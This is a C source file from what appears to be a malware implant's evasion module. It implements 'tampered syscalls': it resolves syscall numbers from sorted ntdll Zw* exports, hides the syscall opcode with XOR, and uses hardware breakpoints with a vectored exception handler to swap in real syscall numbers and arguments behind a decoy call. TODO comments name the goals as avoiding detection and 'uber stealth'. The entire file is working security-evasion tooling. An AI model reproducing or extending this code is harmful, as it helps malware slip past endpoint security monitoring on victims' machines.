//
// Created by Brendan Ortiz on 7/19/2024.
//

#include "../../../../headers/agent/evasion/syscalls/syscalls.h"

#include <intrin.h>

#include "../../../../headers/agent/evasion/PeParsing/evasive.h"
#include <stdio.h>

pSYS_ENTRY_LIST g_SyscallList = NULL;
TAMPERED_SYSCALL g_TamperedSyscall = { 0 };
CRITICAL_SECTION g_CriticalSection = { 0 };
PVOID g_VehHandler = NULL;
LONG ExceptionHandlerCallbackRoutine(IN PEXCEPTION_POINTERS pExceptionInfo);
volatile unsigned short g_SYSCALL_OPCODE = 0x262A; // 0x050F ^ 0x2325

BOOL PopulateSyscallList() {

    PIMAGE_EXPORT_DIRECTORY		pExportDirectory		        = NULL;
    PDWORD				        pdwFunctionNameArray		    = NULL;
    PDWORD				        pdwFunctionAddressArray		= NULL;
    PWORD				        pwFunctionOrdinalArray		= NULL;

    if(g_SyscallList == NULL)
        g_SyscallList = (pSYS_ENTRY_LIST)agent->apis->pLocalAlloc(LPTR, sizeof(SYS_ENTRY_LIST)); // we already have memory reserved for our list

    if(g_SyscallList->u32Count)
        return TRUE; // our list is already populated

    pExportDirectory = GetExportDirectoryAddress(agent->apis->hNtdll);

    pdwFunctionNameArray	= (PDWORD)((LPBYTE)agent->apis->hNtdll + pExportDirectory->AddressOfNames);
    pdwFunctionAddressArray	= (PDWORD)((LPBYTE)agent->apis->hNtdll + pExportDirectory->AddressOfFunctions);
    pwFunctionOrdinalArray	= (PWORD)((LPBYTE)agent->apis->hNtdll + pExportDirectory->AddressOfNameOrdinals);

    // Store Zw* syscalls addresses
    for (int i = 0; i < pExportDirectory->NumberOfNames; i++){

        LPSTR pFunctionName = (LPSTR)((LPBYTE)agent->apis->hNtdll + pdwFunctionNameArray[i]);

        if (*(unsigned short*)pFunctionName == 'wZ' && g_SyscallList->u32Count <= MAX_ENTRIES) {
            g_SyscallList->Entries[g_SyscallList->u32Count].dw64Hash	= Rotr64HashA(pFunctionName);
            g_SyscallList->Entries[g_SyscallList->u32Count].uAddress	= (ULONG_PTR)((LPBYTE)agent->apis->hNtdll + pdwFunctionAddressArray[pwFunctionOrdinalArray[i]]);
            g_SyscallList->u32Count++;
        }
    }

    // Sort Zw* syscalls addresses in ascending order
    // bubble sort addresses.
    for (int i = 0; i < g_SyscallList->u32Count - 0x01; i++){

        for (int j = 0; j < g_SyscallList->u32Count - i - 0x01; j++){

            if (g_SyscallList->Entries[j].uAddress > g_SyscallList->Entries[j + 1].uAddress) {

                SYSCALL_ENTRY TempEntry = { .dw64Hash = g_SyscallList->Entries[j].dw64Hash, .uAddress = g_SyscallList->Entries[j].uAddress };

                g_SyscallList->Entries[j].dw64Hash = g_SyscallList->Entries[j + 1].dw64Hash;
                g_SyscallList->Entries[j].uAddress = g_SyscallList->Entries[j + 1].uAddress;

                g_SyscallList->Entries[j + 1].dw64Hash = TempEntry.dw64Hash;
                g_SyscallList->Entries[j + 1].uAddress = TempEntry.uAddress;

            }
        }
    }

    return TRUE; // populated and sorted.
}

DWORD FetchSSNFromSyscallEntries(DWORD64 dw64Hash) {

    if(!PopulateSyscallList())
        return 0x00;

    for (int i = 0; i < g_SyscallList->u32Count; i++) {
        if (g_SyscallList->Entries[i].dw64Hash == dw64Hash)
            return i;
    }

    return 0x00;
}

VOID PopulateTamperedSyscall(ULONG_PTR uParam1, ULONG_PTR uParam2, ULONG_PTR uParam3, ULONG_PTR uParam4, DWORD dwSyscallNumber) {

    EnterCriticalSection(&g_CriticalSection);
    //TODO : add support for handling more than 4 parameters. Since the stack is involved at that point you'll likley need to handle it with ASM function during callback.
    g_TamperedSyscall.uParam1 = uParam1;
    g_TamperedSyscall.uParam2 = uParam2;
    g_TamperedSyscall.uParam3 = uParam3;
    g_TamperedSyscall.uParam4 = uParam4;
    g_TamperedSyscall.dwSyscallNumber = dwSyscallNumber;

    LeaveCriticalSection(&g_CriticalSection);

}

BOOL InitHardwareBreakpointHooking() {
    if(g_VehHandler)
        return TRUE;

    InitializeCriticalSection(&g_CriticalSection);

    if(!(g_VehHandler = AddVectoredExceptionHandler(0x01, (PVECTORED_EXCEPTION_HANDLER)ExceptionHandlerCallbackRoutine))) {
        return FALSE;
    }

    return TRUE;
}

BOOL HaltHardwareBreakpointHooking() {
    DeleteCriticalSection(&g_CriticalSection);

    if(g_VehHandler) {
        if(RemoveVectoredExceptionHandler(g_VehHandler) == 0x00) {
            return FALSE;
        }

        return TRUE;
    }
    return FALSE;
}

unsigned long long SetDr7Bits(unsigned long long CurrentDr7Register, int StartingBitPosition, int NmbrOfBitsToModify, unsigned long long NewBitValue) {
    unsigned long long mask			    = (1UL << NmbrOfBitsToModify) - 1UL;
    unsigned long long NewDr7Register	= (CurrentDr7Register & ~(mask << StartingBitPosition)) | (NewBitValue << StartingBitPosition);
    return NewDr7Register;
}

/*
 TODO : Implement this function in a way that uses a list of benign functions chosen at random to hook to avoid detection.
 Once the syscall is used, the hook should be removed
 and then a new syscall should be chosen at random to hook.
*/
BOOL InstallHardwareBreakpointHook(_In_ DWORD dwThreadID, _In_ ULONG_PTR uTargetFuncAddress) {
    CONTEXT Context = {.ContextFlags = CONTEXT_DEBUG_REGISTERS};
    HANDLE hThread = NULL;
    BOOL bResult = FALSE;

    //TODO : use indirect syscalls and native functions for this for uber stealth.
    if(!(hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, dwThreadID))) {
        goto _END_OF_FUNC;
    }

    if(!GetThreadContext(hThread, &Context)) {
        goto _END_OF_FUNC;
    }

    Context.Dr0 = uTargetFuncAddress;
    Context.Dr6 = 0x00;
    Context.Dr7 = SetDr7Bits(Context.Dr7, 0x10, 0x02, 0x00); // Clear the local and global exact breakpoints
    Context.Dr7 = SetDr7Bits(Context.Dr7, 0x12, 0x02, 0x00); // Clear the local and global exact breakpoints
    Context.Dr7 = SetDr7Bits(Context.Dr7, 0x00, 0x01, 0x01); // Set the local exact breakpoint

    if(!SetThreadContext(hThread, &Context))
        goto _END_OF_FUNC;

    bResult = TRUE;

    _END_OF_FUNC:
    if(hThread)
        CloseHandle(hThread);

    return bResult;
}

BOOL InitializeTamperedSyscall(_In_ ULONG_PTR uCalledSyscallAddress, _In_ DWORD64 FunctionHash, _In_ ULONG_PTR uParam1, _In_ ULONG_PTR uParam2, _In_ ULONG_PTR uParam3, _In_ ULONG_PTR uParam4) {

   if(!uCalledSyscallAddress || !FunctionHash)
       return FALSE;

    PVOID pDecoySyscallInstructionAdd = NULL;
    DWORD dwRealSyscallNumber = 0x00;

    for(int i = 0; i < 0x20; i++) {
        unsigned short opcodes = *(unsigned short*)(uCalledSyscallAddress + i);
        if(opcodes == (0x2325 ^ g_SYSCALL_OPCODE)) {
            pDecoySyscallInstructionAdd = (PVOID)(uCalledSyscallAddress + i);
            break;
        }
    }

    if(!pDecoySyscallInstructionAdd)
        return FALSE;

    if(!(dwRealSyscallNumber = FetchSSNFromSyscallEntries(FunctionHash)))
        return FALSE;

    PopulateTamperedSyscall(uParam1, uParam2, uParam3, uParam4, dwRealSyscallNumber);

    if(!InstallHardwareBreakpointHook(GetCurrentThreadId(), (ULONG_PTR)pDecoySyscallInstructionAdd))
        return FALSE;

    return TRUE;
}

LONG ExceptionHandlerCallbackRoutine(IN PEXCEPTION_POINTERS pExceptionInfo) {
    BOOL bResolved = FALSE;

    if(pExceptionInfo->ExceptionRecord->ExceptionCode != STATUS_SINGLE_STEP)
        goto _EXIT_ROUTINE;

    if((ULONG_PTR)pExceptionInfo->ExceptionRecord->ExceptionAddress != pExceptionInfo->ContextRecord->Dr0)
        goto _EXIT_ROUTINE;

    EnterCriticalSection(&g_CriticalSection);

    //TODO : add support for 32bit processes.
    //Replace Decoy SSN
    pExceptionInfo->ContextRecord->Rax = (DWORD64)g_TamperedSyscall.dwSyscallNumber;
    // replace decoy parms
    pExceptionInfo->ContextRecord->R10 = (DWORD64)g_TamperedSyscall.uParam1;
    pExceptionInfo->ContextRecord->Rdx = (DWORD64)g_TamperedSyscall.uParam2;
    pExceptionInfo->ContextRecord->R8 = (DWORD64)g_TamperedSyscall.uParam3;
    pExceptionInfo->ContextRecord->R9 = (DWORD64)g_TamperedSyscall.uParam4;
    //remove breakpoint
    pExceptionInfo->ContextRecord->Dr0 = 0ull;


    printf("[info] rbp : 0x%llx\n", pExceptionInfo->ContextRecord->Rbp);
    printf("[info] rsp : 0x%llx\n", pExceptionInfo->ContextRecord->Rsp);
    printf("[info] address of return address : 0x%p\n", _AddressOfReturnAddress());

    LeaveCriticalSection(&g_CriticalSection);

    bResolved = TRUE;

    _EXIT_ROUTINE:
    return (bResolved ? EXCEPTION_CONTINUE_EXECUTION : EXCEPTION_CONTINUE_SEARCH);
}